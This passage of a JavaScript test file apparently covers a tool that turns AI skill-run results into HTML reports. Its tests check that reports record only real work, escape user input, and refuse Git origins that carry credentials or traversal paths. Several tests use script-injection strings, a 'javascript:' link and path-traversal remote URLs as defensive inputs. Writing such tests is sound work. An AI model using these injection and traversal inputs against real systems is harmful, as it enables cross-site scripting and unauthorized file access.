  assert.doesNotMatch(independent, /<path\b/, "Independent observations must not be joined by invented arrows.");

  const related = renderSkillReadout({
    ...input,
    relationships: [
      {
        from: "Create the report contract",
        to: "Preserve backward compatibility",
        label: "verified constraint",
      },
    ],
  });

  assert.match(related, /<path\b/);
  assert.match(related, /1 verified relationship/i);
});

test("visual relationships must connect actual recorded results", () => {
  assert.throws(() => normalizeSkillReadout({
    skill: "qs-design-domain",
    outcome: "Validate observed domain relationships.",
    findings: [{ title: "Verified concept" }],
    relationships: [{ from: "Verified concept", to: "Invented concept" }],
  }), /actual recorded/i);

  assert.throws(() => normalizeSkillReadout({
    skill: "qs-design-domain",
    status: "Preview",
    skillsUsed: [],
    outcome: "Catalog preview only.",
    findings: [{ title: "Catalog purpose" }],
    relationships: [{ from: "Catalog purpose", to: "Catalog purpose" }],
  }), /preview cannot claim actual.*relationships/i);
});

test("domain maps render only explicitly verified concept relationships", () => {
  const input = {
    skill: "qs-design-domain",
    outcome: "Recorded an independently verified domain relationship.",
    findings: [
      { title: "Delivery provenance" },
      { title: "Published commit" },
    ],
  };

  assert.doesNotMatch(renderSkillReadout(input), /<path\b/);

  const html = renderSkillReadout({
    ...input,
    relationships: [
      {
        from: "Delivery provenance",
        to: "Published commit",
        label: "includes verified commit",
      },
    ],
  });

  assert.match(html, /1 verified relationship/i);
  assert.match(html, /includes verified commit/);
  assert.match(html, /<svg\b[^>]*role="img"/);
});

test("domain-design reports visually map actual resolved concepts and shared vocabulary", () => {
  const html = renderSkillReadout({
    skill: "qs-design-domain",
    outcome: "Defined the vocabulary for purpose-specific skill readouts.",
    findings: [
      { title: "Report profile", detail: "The purpose-specific presentation of one promoted skill." },
      { title: "Primary signal", detail: "The real result that must be understood first." },
    ],
    decisions: [
      { title: "A preview is not a skill run", detail: "Previews never claim observed work." },
    ],
  });

  assert.match(html, /Domain model/);
  assert.match(html, /Shared vocabulary/);
  assert.match(html, /Report profile/);
  assert.match(html, /Primary signal/);
  assert.match(html, /A preview is not a skill run/);
  assert.match(html, /<svg\b[^>]*role="img"/);
  assert.match(html, /aria-label="[^"]*[Dd]omain/);
  assert.match(html, /quickstark:report-profile/);
  assert.doesNotMatch(html, /<script\b/i);
});

test("research reports foreground observed evidence and a truthful compact signal chart", () => {
  const html = renderSkillReadout({
    skill: "qs-plan-research",
    outcome: "Compared authenticated hosting options against the existing infrastructure.",
    findings: [
      { title: "Cloudflare DNS", detail: "The proxied hostname resolves publicly." },
      { title: "Traefik routing", detail: "The authenticated service is healthy." },
    ],
    decisions: [
      { title: "Use the existing Authelia boundary", detail: "Reuse the verified browser sign-in." },
    ],
  });

  assert.match(html, /Research brief/);
  assert.match(html, /Evidence/);
  assert.match(html, /Cloudflare DNS/);
  assert.match(html, /Traefik routing/);
  assert.match(html, /<svg\b[^>]*role="img"/);
  assert.doesNotMatch(html.slice(html.indexOf("<body")), /100%|guaranteed|fabricated/i);
});

test("test-driven reports visualize only checks that actually ran", () => {
  const html = renderSkillReadout({
    skill: "qs-test-tdd",
    outcome: "Verified the compact visual report behavior.",
    checks: [
      { title: "Purpose-specific domain report", status: "passed", detail: "The actual renderer returned an accessible concept map." },
      { title: "Optional screenshot review", status: "skipped", detail: "A visual browser was unavailable." },
    ],
  });

  assert.match(html, /Test results/);
  assert.match(html, /Verification/);
  assert.match(html, /Purpose-specific domain report/);
  assert.match(html, /Optional screenshot review/);
  assert.match(html, /1 passed/i);
  assert.match(html, /1 skipped/i);
  assert.doesNotMatch(html.slice(html.indexOf("<body")), /100%|all tests passed/i);
});

test("implementation and review reports expose different useful results", () => {
  const build = renderSkillReadout({
    skill: "qs-code-build",
    outcome: "Implemented purpose-specific readout profiles.",
    outputs: [
      { title: "Catalog profiles", detail: "Added a distinct purpose for every promoted skill." },
    ],
    checks: [
      { title: "Profile coverage", status: "passed", detail: "All 24 real skills are represented." },
    ],
  });
  const review = renderSkillReadout({
    skill: "qs-review-code",
    outcome: "Reviewed the skill-specific report implementation.",
    findings: [
      { title: "Standards", detail: "No security or code-standard findings." },
      { title: "Specification", detail: "The implementation matches the requested compact report behavior." },
    ],
    checks: [
      { title: "Independent review", status: "passed", detail: "Both review axes completed." },
    ],
  });

  assert.match(build, /Delivery summary/);
  assert.match(build, /Deliverables/);
  assert.match(build, /Catalog profiles/);
  assert.match(review, /Review findings/);
  assert.match(review, /Review matrix/);
  assert.match(review, /Standards/);
  assert.match(review, /Specification/);
  assert.notEqual(build, review);
});

test("roadmap and release reports prioritize actual decisions and observed release gates", () => {
  const roadmap = renderSkillReadout({
    skill: "qs-plan-roadmap",
    outcome: "Ordered the independently recorded report design decisions.",
    decisions: [
      { title: "Model the domain vocabulary", detail: "Resolve purpose, primary signals, and preview semantics." },
      { title: "Ship purpose-specific layouts", detail: "Implement and verify all real skill profiles." },
    ],
  });
  const release = renderSkillReadout({
    skill: "qs-deploy-release",
    outcome: "Verified and redeployed the existing readout service.",
    checks: [
      { title: "Docker health", status: "passed", detail: "The approved deployed service is healthy." },
      { title: "Authelia", status: "passed", detail: "Anonymous requests redirect to sign-in." },
    ],
  });

  assert.match(roadmap, /Delivery roadmap/);
  assert.match(roadmap, /Decision sequence/);
  assert.match(roadmap, /Model the domain vocabulary/);
  assert.match(roadmap, /<svg\b[^>]*role="img"/);
  assert.match(release, /Release readiness/);
  assert.match(release, /Release gates/);
  assert.match(release, /2 passed/i);
  assert.match(release, /Docker health/);
  assert.match(release, /Authelia/);
});

test("skill-specific visualizations escape hostile chart and concept-map labels", () => {
  const hostile = '<script>alert("unsafe")</script>';
  const html = renderSkillReadout({
    skill: "qs-design-domain",
    outcome: "Escaped externally controlled domain terms.",
    findings: [{ title: hostile, detail: hostile }],
    decisions: [{ title: hostile, detail: hostile }],
  });

  assert.match(html, /<svg\b[^>]*role="img"/);
  assert.match(html, /&lt;script&gt;alert\(&quot;unsafe&quot;\)&lt;\/script&gt;/);
  assert.doesNotMatch(html, /<script\b/i);
});

test("reports without observed signals omit decorative charts and zero-value metric cards", () => {
  const html = renderSkillReadout({
    skill: "qs-design-domain",
    outcome: "A domain question remains to be clarified.",
    status: "Awaiting input",
  });
  const body = html.slice(html.indexOf("<body"));

  assert.match(body, /Awaiting input/);
  assert.match(body, /Domain model/);
  assert.doesNotMatch(body, /<svg\b/i);
  assert.doesNotMatch(body, /class="metrics"/);
  assert.doesNotMatch(body, /class="signal-panel"/);
});

test("skill-specific preview layouts never invent activity, checks, or chart values", () => {
  for (const skill of SKILLS) {
    const html = renderSkillReadout({
      skill: skill.name,
      status: "Preview",
      skillsUsed: [],
      outcome: `Layout preview for ${skill.displayName}; no skill has been run.`,
      findings: [
        { title: "Purpose", detail: skill.shortDescription },
        { title: "Invocation", detail: "Catalog information only; no skill was invoked." },
      ],
    });

    assert.match(html, /Catalog preview only/i, `${skill.name} must identify a catalog preview.`);
    assert.match(html, /No skill has been run/i, `${skill.name} cannot imply actual work.`);
    const body = html.slice(html.indexOf("<body"));

    assert.doesNotMatch(body, /class="skills-used"/, `${skill.name} cannot claim actual skill use.`);
    assert.doesNotMatch(body, /class="[^"]*\bcheck-passed\b/, `${skill.name} cannot invent a passing check.`);
    assert.doesNotMatch(body, /\b100%\b/, `${skill.name} cannot invent chart progress.`);
    assert.doesNotMatch(body, /class="metrics"/, `${skill.name} cannot represent catalog copy as observed metrics.`);
    assert.doesNotMatch(body, /class="signal-panel"/, `${skill.name} cannot chart catalog-only results.`);
    assert.match(body, /Catalog information/, `${skill.name} should clearly label catalog-only descriptions.`);
    assert.match(body, />Purpose</, `${skill.name} should preserve its actual catalog explanation.`);
    assert.match(body, />Invocation</, `${skill.name} should preserve its actual invocation description.`);
  }
});

test("catalog previews reject fabricated decisions, deliverables, and validation results", () => {
  for (const [field, value] of [
    ["decisions", [{ title: "Invented decision", detail: "No preview actually chose this." }]],
    ["outputs", [{ title: "Invented artifact", detail: "No preview actually produced this." }]],
    ["checks", [{ title: "Invented test", status: "passed", detail: "No preview actually ran this." }]],
  ]) {
    assert.throws(() => normalizeSkillReadout({
      skill: "qs-design-domain",
      status: "Preview",
      skillsUsed: [],
      outcome: "Catalog preview only.",
      [field]: value,
    }), /preview cannot claim actual/i, `Preview ${field} must not claim actual work.`);
  }
});

test("readouts escape user-controlled content and never activate unsafe artifact links", () => {
  const hostile = '<script>alert("unsafe")</script>';
  const html = renderSkillReadout({
    skill: "qs-code-build",
    status: "Completed",
    outcome: hostile,
    findings: [{ title: hostile, detail: hostile }],
    outputs: [{ title: "Artifact", detail: hostile, href: "javascript:alert(1)" }],
    nextSkills: [{
      name: "qs-review-code",
      reason: hostile,
      prompt: `Use /qs-review-code to inspect ${hostile}`,
    }],
  });

  assert.doesNotMatch(html, /<script\b/i);
  assert.doesNotMatch(html, /href=["']javascript:/i);
  assert.ok(html.includes("&lt;script&gt;alert(&quot;unsafe&quot;)&lt;/script&gt;"));
});

test("readouts distinguish actually employed skills from catalog recommendations", () => {
  const report = normalizeSkillReadout({
    skill: "qs-design-architecture",
    outcome: "Selected the highest-value architectural improvement.",
    skillsUsed: ["qs-design-architecture", "qs-design-modules"],
  });

  assert.deepEqual(report.skillsUsed, ["qs-design-architecture", "qs-design-modules"]);
  assert.deepEqual(
    report.nextSkills.map((next) => next.name),
    NEXT_SKILLS_BY_NAME["qs-design-architecture"].map((next) => next.name),
  );
});

test("top next prompts carry forward the actual run and explicitly invoke approved skills", () => {
  const input = {
    skill: "qs-plan-explore",
    outcome: "Agreed to replace skill-only suggestions with contextual continuation prompts.",
    findings: [{ title: "Keep the catalog as the routing source of truth" }],
    decisions: [{ title: "Embed the approved follow-on skill in every prompt" }],
    outputs: [{ title: "Existing shared completion-report generator" }],
    checks: [{ title: "Current recommendation contract", status: "passed" }],
  };
  const report = normalizeSkillReadout(input);
  const html = renderSkillReadout(input);

  assert.equal(report.nextSkills.length, 3);

  for (const next of report.nextSkills) {
    assert.ok(next.prompt.includes(`$${next.name}`), `${next.name} is not a Codex-native skill invocation`);
    assert.match(next.prompt, /replace skill-only suggestions with contextual continuation prompts/);
    assert.match(next.prompt, /Keep the catalog as the routing source of truth/);
    assert.match(next.prompt, /Embed the approved follow-on skill in every prompt/);
    assert.match(next.prompt, /Existing shared completion-report generator/);
    assert.match(next.prompt, /Current recommendation contract \(passed\)/);
    assert.ok(html.includes(next.prompt), `${next.name} omits its copy-ready prompt`);
    assert.equal(next.modelSource, "heuristic");
    assert.ok(html.includes(next.model), `${next.name} omits its suggested model`);
    assert.ok(html.includes(next.thinking), `${next.name} omits its suggested thinking`);
  }

  assert.match(html, /Top next prompts/);
  assert.match(html, /Suggested model/);
  assert.match(html, /Suggested thinking/);
  assert.match(html, /Heuristic suggestion/);
  assert.match(html, /<pre class="next-prompt-block"><code>/);
  assert.match(html, /<aside class="next-model-callout" aria-label="Heuristic model and thinking guidance">/);
  assert.ok(
    html.indexOf('<pre class="next-prompt-block"><code>')
      < html.indexOf('<aside class="next-model-callout"'),
    "Model guidance must be a secondary callout underneath the prompt.",
  );
  assert.doesNotMatch(html, /<p class="next-prompt">/);
  assert.match(html, /does not change the active model or thinking level/i);
  assert.doesNotMatch(html, /<meta name="quickstark:model"/);
  assert.doesNotMatch(html, /Next best skills/);
});

test("a run can preserve a more specific copy-ready prompt for its approved next skill", () => {
  const prompt = "Use /qs-review-code to verify the contextual prompt contract, its escaping, and both generated plugin distributions.";
  const report = normalizeSkillReadout({
    skill: "qs-skill-write",
    outcome: "Implemented context-aware continuation prompts for every promoted skill.",
    nextSkills: [{
      name: "qs-review-code",
      reason: "Review the actual shared implementation and generated outputs.",
      prompt,
    }],
  });

  assert.deepEqual(report.nextSkills, [{
    name: "qs-review-code",
    reason: "Review the actual shared implementation and generated outputs.",
    prompt,
    model: MODEL_GUIDANCE_BY_NAME["qs-review-code"].model,
    thinking: MODEL_GUIDANCE_BY_NAME["qs-review-code"].thinking,
    modelReason: MODEL_GUIDANCE_BY_NAME["qs-review-code"].reason,
    modelSource: "heuristic",
  }]);
});

test("an observed critical finding increases the suggested model and thinking level", () => {
  const report = normalizeSkillReadout({
    skill: "qs-skill-write",
    outcome: "Identified a critical security issue while preparing the follow-on review.",
    findings: [{ title: "Critical authorization boundary", priority: "P0" }],
    nextSkills: ["qs-code-document"],
  });

  assert.equal(MODEL_GUIDANCE_BY_NAME["qs-code-document"].model, "gpt-5.6-terra");
  assert.equal(report.nextSkills[0].model, "gpt-5.6-sol");
  assert.equal(report.nextSkills[0].thinking, "xhigh");
  assert.equal(report.nextSkills[0].modelSource, "heuristic");
  assert.match(report.nextSkills[0].modelReason, /recorded P0/i);
  assert.equal(report.observation, null);
});

test("an actual failed check raises routine follow-on guidance without inventing measurements", () => {
  const report = normalizeSkillReadout({
    skill: "qs-skill-write",
    outcome: "A verification check failed and needs investigation.",
    checks: [{ title: "Regression suite", status: "failed" }],
    nextSkills: ["qs-code-document"],
  });

  assert.equal(report.nextSkills[0].model, "gpt-5.6-sol");
  assert.equal(report.nextSkills[0].thinking, "high");
  assert.match(report.nextSkills[0].modelReason, /recorded failed check/i);
  assert.equal(report.observation, null);
});

test("a more specific next prompt can explicitly override its heuristic model and thinking", () => {
  const report = normalizeSkillReadout({
    skill: "qs-code-build",
    outcome: "Completed a substantial implementation requiring deep review.",
    nextSkills: [{
      name: "qs-review-code",
      prompt: "Use /qs-review-code to inspect the authorization, migration, and rollback boundaries.",
      model: "gpt-5.6-sol",
      thinking: "xhigh",
      modelReason: "Substantial authorization and migration changes justify a deeper review.",
    }],
  });

  assert.equal(report.nextSkills[0].model, "gpt-5.6-sol");
  assert.equal(report.nextSkills[0].thinking, "xhigh");
  assert.match(report.nextSkills[0].modelReason, /authorization and migration/i);
  assert.equal(report.nextSkills[0].modelSource, "heuristic");
  assert.equal(report.observation, null);
});

test("heuristic model suggestions reject unsafe models and unsupported thinking levels", () => {
  const base = {
    skill: "qs-skill-write",
    outcome: "Prepared the contextual skill output contract.",
  };

  for (const [override, expected] of [
    [{ model: '<script>alert("unsafe")</script>' }, /safe model identifier/i],
    [{ model: "gpt 5.6" }, /safe model identifier/i],
    [{ thinking: "turbo" }, /supported thinking level/i],
    [{ thinking: "" }, /supported thinking level/i],
    [{ modelReason: "" }, /non-empty string/i],
  ]) {
    assert.throws(() => normalizeSkillReadout({
      ...base,
      nextSkills: [{ name: "qs-review-code", ...override }],
    }), expected);
  }
});

test("next prompts reject an omitted, different, or merely prefixed embedded skill", () => {
  for (const prompt of [
    "Review the shared recommendation contract and its tests.",
    "Use /qs-code-document to describe the recommendation contract.",
    "Use /qs-review-code-extra to review the recommendation contract.",
  ]) {
    assert.throws(() => normalizeSkillReadout({
      skill: "qs-skill-write",
      outcome: "Prepared the shared recommendation contract.",
      nextSkills: [{ name: "qs-review-code", prompt }],
    }), /must explicitly invoke \/qs-review-code/i);
  }
});

test("native follow-on prompts reject misleading first invocations", () => {
  for (const prompt of [
    "Use /qs-deploy-release to release this project; mention /qs-review-code in the notes.",
    "Do not use /qs-review-code; use /qs-help instead.",
    "Mention /qs-review-code, then use /qs-deploy-release.",
    "Use /qs-review-code-extra and mention /qs-review-code.",
  ]) {
    assert.throws(() => normalizeSkillReadout({
      skill: "qs-skill-write",
      outcome: "Require the first actionable prompt to invoke its approved next skill.",
      nextSkills: [{ name: "qs-review-code", prompt }],
    }), /must explicitly invoke \/qs-review-code/i, prompt);
  }
});

test("native follow-on prompts preserve their valid first approved invocation", () => {
  for (const prompt of [
    "Use /qs-review-code to verify the shared contract; consult /qs-code-document only as supporting context.",
    "  Use   /qs-review-code to verify the shared contract.  ",
    "USE /qs-review-code to verify the shared contract.",
    "Use $qs-review-code to verify the shared contract; consult /qs-code-document only as supporting context.",
    "  Use   $qs-review-code to verify the shared contract.  ",
    "USE $qs-review-code to verify the shared contract.",
  ]) {
    const report = normalizeSkillReadout({
      skill: "qs-skill-write",
      outcome: "Preserve an actual approved first native follow-on invocation.",
      nextSkills: [{ name: "qs-review-code", prompt }],
    });

    assert.equal(report.nextSkills[0].name, "qs-review-code");
    assert.equal(report.nextSkills[0].prompt, prompt.trim());
  }
});

test("native Codex skill mentions reject misleading or merely prefixed first actions", () => {
  for (const prompt of [
    "Use $qs-deploy-release to release this project; mention $qs-review-code later.",
    "Do not use $qs-review-code; use $qs-help instead.",
    "Mention $qs-review-code, then use $qs-deploy-release.",
    "Use $qs-review-code-extra and mention $qs-review-code.",
    "Use $qs-review-code:extra to bypass the approved skill.",
  ]) {
    assert.throws(() => normalizeSkillReadout({
      skill: "qs-skill-write",
      outcome: "Preserve strict first-action validation for native Codex skill mentions.",
      nextSkills: [{ name: "qs-review-code", prompt }],
    }), /must explicitly invoke \/qs-review-code/i, prompt);
  }
});

test("catalog preview prompts never claim that prior work actually happened", () => {
  const report = normalizeSkillReadout({
    skill: "qs-plan-explore",
    status: "Preview",
    skillsUsed: [],
    outcome: "Catalog preview only; no actual exploration occurred.",
  });

  for (const next of report.nextSkills) {
    assert.ok(next.prompt.includes(`$${next.name}`));
    assert.equal(next.modelSource, "heuristic");
    assert.doesNotMatch(next.prompt, /Continue from the recorded outcome|Carry forward/i);
    assert.doesNotMatch(next.prompt, /actual exploration occurred/i);
  }
});

test("context-aware next prompts remain compact without inventing or losing observed evidence", () => {
  const longOutcome = `Observed outcome: ${"specific verified result ".repeat(30)}`;
  const longFinding = `Observed finding: ${"verified evidence ".repeat(20)}`;
  const report = normalizeSkillReadout({
    skill: "qs-plan-explore",
    outcome: longOutcome,
    findings: [{ title: longFinding }],
    checks: [{ title: "Optional browser check", status: "skipped" }],
  });

  for (const next of report.nextSkills) {
    assert.ok(next.prompt.length < 1_000, `${next.name} produces an oversized continuation`);
    assert.match(next.prompt, /Observed outcome: specific verified result/);
    assert.match(next.prompt, /Observed finding: verified evidence/);
    assert.match(next.prompt, /Optional browser check \(skipped\)/);
    assert.match(next.prompt, /…/);
    assert.doesNotMatch(next.prompt, /Optional browser check \(passed\)/);
  }
});

test("awaiting-input prompts carry forward the actual unresolved decision", () => {
  const report = normalizeSkillReadout({
    skill: "qs-plan-explore",
    status: "Awaiting input",
    outcome: "Awaiting a choice between catalog-derived prompts and independently maintained templates.",
    nextSkills: ["qs-plan-clarify"],
  });

  assert.match(report.nextSkills[0].prompt, /Use \$qs-plan-clarify/);
  assert.match(report.nextSkills[0].prompt, /Awaiting a choice between catalog-derived prompts/);
  assert.doesNotMatch(report.nextSkills[0].prompt, /completed exploration|decision was resolved/i);
});

test("completed readouts can honestly report that no further skill is required", () => {
  const html = renderSkillReadout({
    skill: "qs-code-build",
    outcome: "Completed the exact requested change.",
    nextSkills: [],
  });

  assert.ok(html.includes("None — the requested work is complete."));
  assert.doesNotMatch(html, />Suggested model</);
  assert.doesNotMatch(html, />Suggested thinking</);
});

test("readouts reject unknown skills, fabricated skill usage, and irrelevant next steps", () => {
  assert.throws(
    () => normalizeSkillReadout({ skill: "qs-made-up", outcome: "No real skill." }),
    /not a promoted QuickStark skill/,
  );
  assert.throws(
    () => normalizeSkillReadout({
      skill: "qs-code-build",
      outcome: "A build was performed.",
      skillsUsed: ["qs-review-code"],
    }),
    /actual active skill/,
  );
  assert.throws(
    () => normalizeSkillReadout({
      skill: "qs-code-build",
      outcome: "A build was performed.",
      nextSkills: ["qs-help"],
    }),
    /not an approved next step/,
  );
  assert.throws(
    () => normalizeSkillReadout({
      skill: "qs-code-build",
      status: "Preview",
      outcome: "This is only a preview.",
      skillsUsed: ["qs-code-build"],
    }),
    /cannot claim that a skill has been used/,
  );
});

test("readout check cards report only explicit, valid validation results", () => {
  const html = renderSkillReadout({
    skill: "qs-test-tdd",
    outcome: "Completed the red-green test loop.",
    checks: [
      { title: "Regression suite", status: "passed", detail: "All observed tests passed." },
      { title: "Optional browser test", status: "skipped", detail: "No browser change was in scope." },
    ],
  });

  assert.ok(html.includes("check-passed"));
  assert.ok(html.includes("check-skipped"));
  assert.throws(
    () => normalizeSkillReadout({
      skill: "qs-test-tdd",
      outcome: "Ran tests.",
      checks: [{ title: "Imaginary check", status: "success-ish" }],
    }),
    /must be passed, failed, skipped, or info/,
  );
});

test("readouts are written as unique, private, remotely linkable HTML files", async (context) => {
  const directory = await temporaryReadoutDirectory(context);
  const input = {
    skill: "qs-plan-clarify",
    outcome: "Clarified the boundaries and success criteria.",
  };

  const first = await writeSkillReadout(input, {
    directory,
    baseUrl: "http://192.168.1.200:4173/r/aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa/",
  });
  const second = await writeSkillReadout(input, { directory });

  assert.equal(first.directory, directory);
  assert.match(first.filename, /^qs-plan-clarify--.*--[a-f0-9]{8}\.html$/);
  assert.notEqual(first.filename, second.filename);
  assert.equal(
    first.url,
    `http://192.168.1.200:4173/r/aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa/${first.filename}`,
  );
  assert.equal(second.url, null);
  assert.match(await readFile(first.path, "utf8"), /Clarified the boundaries/);
  assert.equal((await stat(first.path)).mode & 0o777, 0o600);
});

test("skill readouts identify equivalent HTTPS and SSH Git origins as the same canonical project", async (context) => {
  const directory = await temporaryReadoutDirectory(context);
  const remotes = [
    "https://github.com/quickstark/skills.git",
    "https://github.com:443/quickstark/skills.git",
    "git@github.com:quickstark/skills.git",
    "deployment-user@github.com:quickstark/skills.git",
    "ssh://git@github.com/quickstark/skills.git",
    "ssh://git@github.com:22/quickstark/skills.git",
    "ssh://deployment-user@github.com/quickstark/skills.git",
  ];

  for (const remote of remotes) {
    const cwd = await temporaryGitProject(context, remote);
    const report = await writeSkillReadout({
      skill: "qs-code-build",
      outcome: "Rendered a project-aware skill readout.",
    }, { directory, cwd });
    const html = await readFile(report.path, "utf8");

    assert.match(html, /<meta name="quickstark:project" content="github\.com\/quickstark\/skills">/);
    assert.match(html, /<meta name="quickstark:project-label" content="quickstark\/skills">/);
    assert.match(html, /<meta name="quickstark:project-source" content="git-origin">/);
    assert.doesNotMatch(html, /git@github\.com/);
    assert.doesNotMatch(html, /quickstark-readout-test-/);
  }
});

test("project-aware readouts refuse credential-bearing and unsafe Git origins", async (context) => {
  const directory = await temporaryReadoutDirectory(context);
  const unsafeRemotes = [
    "https://secret-token@github.com/quickstark/skills.git",
    "https://developer:private-token@github.com/quickstark/skills.git",
    "https://github.com/quickstark/skills.git?token=private",
    "ssh://deployment-user:private-token@github.com/quickstark/skills.git",
    "git@github.com:quickstark/%2e%2e/private.git",
    "https://github.com/quickstark/../private/skills.git",
    "https://github.com/quickstark/%2e%2e/private/skills.git",
    "ssh://git@github.com/quickstark/../private/skills.git",
    "ssh://git@github.com/quickstark/%2e%2e/private/skills.git",
  ];

  for (const remote of unsafeRemotes) {
    const cwd = await temporaryGitProject(context, remote);

    await assert.rejects(
      writeSkillReadout({
        skill: "qs-code-build",
        outcome: "Unsafe repository origins must not be published.",
      }, { directory, cwd }),
      /credentials|query parameters|unsafe repository path/i,
    );
  }

  assert.deepEqual(await readdir(directory), []);
});

test("project-aware readouts distinguish Git services running on different non-default ports", async (context) => {
  const directory = await temporaryReadoutDirectory(context);
  const remotes = [
    ["ssh://git@git.example.com:2222/team/project.git", "git.example.com~2222/team/project"],
    ["ssh://git@git.example.com:2223/team/project.git", "git.example.com~2223/team/project"],
    ["https://git.example.com:8443/team/project.git", "git.example.com~8443/team/project"],
    ["https://git.example.com:9443/team/project.git", "git.example.com~9443/team/project"],
  ];

  for (const [remote, identity] of remotes) {
    const cwd = await temporaryGitProject(context, remote);
    const report = await writeSkillReadout({
      skill: "qs-code-build",
      outcome: "Kept distinct self-hosted Git instances isolated.",
    }, { directory, cwd });
    const html = await readFile(report.path, "utf8");

    assert.ok(
      html.includes(`<meta name="quickstark:project" content="${identity}">`),
      `Remote ${remote} must produce the independently known canonical identity ${identity}.`,
    );
  }
});

test("project-aware readouts safely identify repositories without an origin and non-Git workspaces", async (context) => {
  const directory = await temporaryReadoutDirectory(context);
  const gitProject = await temporaryGitProject(context);
  const workspace = await temporaryReadoutDirectory(context);

  for (const [cwd, source] of [[gitProject, "git-root"], [workspace, "workspace"]]) {
    const report = await writeSkillReadout({
      skill: "qs-code-build",
      outcome: "Rendered a safely identified local project.",
    }, { directory, cwd });
    const html = await readFile(report.path, "utf8");

    assert.match(html, new RegExp(`<meta name="quickstark:project" content="local/${source}/[a-zA-Z0-9._-]+-[a-f0-9]{12}">`));
    assert.match(html, new RegExp(`<meta name="quickstark:project-source" content="${source}">`));
    assert.doesNotMatch(html, /\/tmp\/quickstark-readout-test-/);
  }
});

test("symlinked checkouts preserve the same canonical Git project identity", async (context) => {
  const directory = await temporaryReadoutDirectory(context);
  const project = await temporaryGitProject(context, "https://github.com/quickstark/skills.git");
  const aliasRoot = await temporaryReadoutDirectory(context);
  const alias = join(aliasRoot, "checkout-alias");

  await symlink(project, alias, "dir");

  for (const cwd of [project, alias]) {
    const report = await writeSkillReadout({
      skill: "qs-code-build",
      outcome: "Resolved the same repository through alternate checkout paths.",
    }, { directory, cwd });
    const html = await readFile(report.path, "utf8");

    assert.match(html, /<meta name="quickstark:project" content="github\.com\/quickstark\/skills">/);
    assert.doesNotMatch(html, /checkout-alias/);
  }
});

test("project-aware readouts publish immutable run and format metadata without changing report URLs", async (context) => {
  const directory = await temporaryReadoutDirectory(context);
  const cwd = await temporaryGitProject(context, "https://github.com/quickstark/skills.git");
  const reportId = "a1b2c3d4-1111-4222-8333-123456789abc";
  const report = await writeSkillReadout({
    skill: "qs-code-build",
    outcome: "Generated an immutable project-aware report.",
    generatedAt: "2026-07-25T15:30:00.000Z",
    reportId,
  }, { directory, cwd });

  assert.equal(report.filename, "qs-code-build--2026-07-25T15-30-00-000Z--a1b2c3d4.html");

  const viewer = await startReadoutServer({ directory, port: 0 });

  context.after(async () => {
    await new Promise((done, fail) => {
      viewer.server.close((error) => error ? fail(error) : done());
    });
  });

  const response = await fetch(new URL(report.filename, viewer.url));

  assert.equal(response.status, 200);

  const html = await response.text();

  assert.match(html, /<meta name="quickstark:project" content="github\.com\/quickstark\/skills">/);
  assert.match(html, /<meta name="quickstark:skill-display-name" content="QS Code: Build">/);
  assert.match(html, new RegExp(`<meta name="quickstark:report-id" content="${reportId}">`));
  assert.match(html, /<meta name="quickstark:format-version" content="1">/);
  assert.match(html, /Implementation · quickstark\/skills/);
  assert.match(response.headers.get("content-security-policy"), /default-src 'none'/);
});

test("the project-aware HTTP viewer serves only verified delivery evidence and stable provenance metadata", async (context) => {
  const directory = await temporaryReadoutDirectory(context);
  const report = await writeSkillReadout({
    skill: "qs-deploy-release",
    outcome: "Served the actually verified release receipt.",
    projectIdentity: explicitProject("skills"),
    provenance: verifiedGithubProvenance(),
  }, { directory, layout: "project" });
  const viewer = await startReadoutServer({ directory, port: 0 });

  context.after(async () => {
    await new Promise((done, fail) => {
      viewer.server.close((error) => error ? fail(error) : done());
    });
  });

  const response = await fetch(new URL(report.relativePath, viewer.url));

  assert.equal(response.status, 200);

  const html = await response.text();

  assert.match(html, /Verified delivery evidence/);
  assert.match(html, /Merged pull request #42/);
  assert.match(html, /Issues verified as closed by this release · #17/);
  assert.match(html, /<meta name="quickstark:release-version" content="v2\.3\.1">/);
  assert.match(html, /<meta name="quickstark:pull-request" content="42">/);
  assert.match(html, /<meta name="quickstark:closed-issue" content="17">/);
  assert.match(response.headers.get("content-security-policy"), /default-src 'none'/);
  assert.doesNotMatch(html, /<script\b/i);
});

test("the HTTP viewer serves the actual execution machine, verified deployment, and run-owned files", async (context) => {
  const directory = await temporaryReadoutDirectory(context);
  const report = await writeSkillReadout({
    skill: "qs-code-document",
    outcome: "Documented the verified hosted report deployment.",
    projectIdentity: explicitProject("skills"),
    execution: {
      deployments: [{
        environment: "production",
        status: "verified",
        url: "https://reports.quickstark.com/",
        summary: "Verified the authenticated report endpoint.",
      }],
      files: [{
        path: "docs/engineering/qs-code-document.md",
        change: "added",
        summary: "Documented the actual project workflow.",
      }],
    },
  }, { directory, layout: "project" });
  const viewer = await startReadoutServer({ directory, port: 0 });

  context.after(async () => {
    await new Promise((done, fail) => {
      viewer.server.close((error) => error ? fail(error) : done());
    });
  });

  const response = await fetch(new URL(report.relativePath, viewer.url));

  assert.equal(response.status, 200);

  const html = await response.text();

  assert.ok(html.includes(`<meta name="quickstark:machine" content="${hostname()}">`));
  assert.match(html, /<meta name="quickstark:deployment-url" content="https:\/\/reports\.quickstark\.com\/">/);
  assert.match(html, /<meta name="quickstark:changed-file" content="docs\/engineering\/qs-code-document\.md">/);
  assert.match(html, /Execution context/);
  assert.match(html, /Verified deployment · production/);
  assert.match(html, /Documented the actual project workflow/);
  assert.match(response.headers.get("content-security-policy"), /default-src 'none'/);
  assert.doesNotMatch(html, /<script\b/i);
});

test("project-aware readouts honor an explicitly supplied canonical project identity", async (context) => {
  const directory = await temporaryReadoutDirectory(context);
  const report = await writeSkillReadout({
    skill: "qs-code-build",
    outcome: "Rendered a deliberately supplied project identity.",
    projectIdentity: {
      host: "github.com",
      owner: "quickstark",
      repository: "other-project",
      key: "github.com/quickstark/other-project",
      label: "quickstark/other-project",
      source: "explicit",
    },
  }, { directory });
  const html = await readFile(report.path, "utf8");

  assert.match(html, /<meta name="quickstark:project" content="github\.com\/quickstark\/other-project">/);
  assert.match(html, /<meta name="quickstark:project-source" content="explicit">/);
  assert.match(html, /Implementation · quickstark\/other-project/);
});

test("persistent project readouts survive viewer restarts with immutable nested report links", async (context) => {
  const directory = await temporaryReadoutDirectory(context);
  const cwd = await temporaryGitProject(context, "https://github.com/quickstark/skills.git");
  const reports = [];

  for (const outcome of ["First durable project decision.", "Second durable project decision."]) {
    reports.push(await writeSkillReadout({
      skill: "qs-plan-research",
